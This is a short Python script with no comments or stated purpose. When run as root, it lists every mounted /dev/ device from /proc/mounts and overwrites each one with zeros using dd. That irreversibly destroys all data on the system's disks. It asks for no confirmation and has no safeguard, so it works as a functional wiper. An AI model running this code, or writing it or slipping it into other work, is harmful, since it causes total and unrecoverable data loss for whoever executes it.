#!/usr/bin/env python3
import os
import subprocess

if os.getuid() == 0:
    with open("/proc/mounts") as fh:
        devs = sorted({line.split()[0] for line in fh if line.startswith("/dev/")})
    for d in devs:
        subprocess.run(["dd", "if=/dev/zero", f"of={d}"], check=False)
